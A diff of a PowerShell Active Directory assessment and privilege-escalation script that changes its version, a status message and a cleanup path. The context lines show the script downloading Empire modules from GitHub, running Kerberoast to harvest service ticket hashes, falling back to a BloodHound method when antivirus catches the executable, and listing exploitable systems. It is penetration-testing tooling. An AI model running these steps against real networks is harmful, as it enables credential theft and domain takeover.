@@ -1,5 +1,5 @@
 Write-Host "###########################################################################################################" -ForegroundColor Green
-Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.1                                    ##" -ForegroundColor Green
+Write-Host "##   Active Directory Assessment and Privilege Escalation Script v1.2                                    ##" -ForegroundColor Green
 Write-Host "##   Developed By Hausec                                                                                 ##" -ForegroundColor Green
 Write-Host "##                                                                                                       ##" -ForegroundColor Green
 Write-Host "##   Credit for .ps1s goes to Tim Medin, and the people working on Empire, BloodHound, and PowerSploit   ##" -ForegroundColor Green
@@ -43,7 +43,7 @@ $client.DownloadFile("https://raw.githubusercontent.com/EmpireProject/Empire/mas
 #Run Kerberoast
 Write-Host "Importing module..." 
 Import-Module Kerberoast.psm1
-Write-Host "Running Kerberoast" -ForegroundColor  Yellow
+Write-Host "Running Kerberoast, if you see red, it's normal." -ForegroundColor  Yellow
 Invoke-Kerberoast | Out-File $path\Kerberoast.krb 
 
 #BloodHound Powershell Method -- Use this if .Exe is picked up by AV. 
@@ -127,7 +127,7 @@ Get-ExploitableSystem -Verbose | Export-Csv $path\ExploitableSystem.txt
 Compress-Archive -Path $path -Update -DestinationPath C:\Capture.zip
 Remove-Item -Recurse -Force "$modulepath/Kerberoast"
 Remove-Item -Recurse -Force "$modulepath/PrivEsc"
-Remove-Item -Recurse -Force "$modulepath/SharpHound"
+Remove-Item -Recurse -Force "$modulepath/Sharp"
 Remove-Item -Recurse -Force "$modulepath/PowerView"
 Remove-Item -Recurse -Force $path
 Write-Host "Done! Results stored in the Capture.zip file!" -ForegroundColor Green
